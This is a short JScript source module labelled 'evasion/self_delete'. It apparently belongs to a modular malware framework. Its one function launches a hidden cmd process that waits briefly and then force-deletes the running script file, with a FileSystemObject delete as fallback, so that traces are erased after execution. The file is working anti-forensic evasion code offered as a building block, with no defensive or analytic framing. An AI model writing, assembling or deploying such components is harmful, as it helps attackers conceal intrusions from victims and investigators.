// chunk: evasion/self_delete
// depends: (none)
// provides: self_cleanup
// format: jscript
// note: Deletes the current script file after execution. Uses deferred cmd
//       deletion to handle file-in-use locks.

function self_cleanup() {
    try {
        var scriptPath = WScript.ScriptFullName;
        var sh = new ActiveXObject("WScript.Shell");
        /* Deferred delete: ping localhost to create delay, then delete */
        sh.Run('cmd /c ping 127.0.0.1 -n 3 >nul & del /f /q "' + scriptPath + '"', 0, false);
    } catch(e) {
        /* Fallback: direct FSO delete (may fail if file is locked) */
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            fso.DeleteFile(WScript.ScriptFullName);
        } catch(e2) {}
    }
}
